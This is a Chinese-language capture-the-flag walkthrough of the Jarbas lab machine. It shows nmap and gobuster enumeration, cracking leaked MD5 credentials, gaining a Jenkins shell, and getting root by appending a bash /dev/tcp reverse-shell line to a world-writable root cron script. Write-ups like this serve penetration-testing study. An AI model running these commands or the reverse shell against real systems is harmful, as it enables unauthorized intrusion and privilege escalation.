### 主机发现和nmap扫描

```bash
nmap -sn 192.168.56.0/24
```

靶机ip：192.168.56.104

```bash
nmap -sT --min-rate 10000 192.168.56.104
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http-proxy
```

```bash
nmap -sT -sV -sC -O -p22,80,3306,8080 192.168.56.104
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 28:bc:49:3c:6c:43:29:57:3c:b8:85:9a:6d:3c:16:3f (RSA)
|   256 a0:1b:90:2c:da:79:eb:8f:3b:14:de:bb:3f:d2:e7:3f (ECDSA)
|_  256 57:72:08:54:b7:56:ff:c3:e6:16:6f:97:cf:ae:7f:76 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Jarbas - O Seu Mordomo Virtual!
3306/tcp open  mysql   MariaDB (unauthorized)
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
```

80,8080都是web服务

### web渗透

打开80页面，部署了一个持续集成的项目（jenkins）,部署项目用的

8080是一个登录页面

#### 目录扫描

```bash
gobuster dir -u http://192.168.56.104/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,php
```

```
/index.html           (Status: 200) [Size: 32808]
/.html                (Status: 403) [Size: 207]
/access.html          (Status: 200) [Size: 359]
```

访问/access.html得到三组凭据

![image-20240603215707851](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240603215707851.png)

进行md5解密

```
tiago:5978a63b4654c73c60fa24f836386d87 italia99
trindade:f463f63616cb3f1e81ce46b39f882fd5 marianna
eder:9b38e2b1e8b12f426b0d208a7ab6cb98  vipsu
```

尝试登录8080，发现eder可以登录

jenkins在构建项目时，可以为该项目增加构建步骤

![image-20240603220331939](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240603220331939.png)

得到一个`jenkins`的shell

### 提权

发现自动任务里有一个以root身份执行的bash脚本，并且我们可以写

```bash
bash-4.2$ cat /etc/crontab
cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
*/5 * * * * root /etc/script/CleaningScript.sh >/dev/null 2>&1
bash-4.2$ ls -l /etc/script/CleaningScript.sh
ls -l /etc/script/CleaningScript.sh
-rwxrwxrwx. 1 root root 100 Jun  3 10:32 /etc/script/CleaningScript.sh
```

写入反弹shell

```bash
echo "/bin/bash -i >& /dev/tcp/192.168.56.101/1234 0>&1" >> etc/script/CleaningScript.sh
```

等待自动任务执行

```bash
[root@jarbas ~]# ls
ls
flag.txt
[root@jarbas ~]# cat flag.txt
cat flag.txt
Hey!

Congratulations! You got it! I always knew you could do it!
This challenge was very easy, huh? =)

Thanks for appreciating this machine.

@tiagotvrs
```

拿到最后的flag.txt
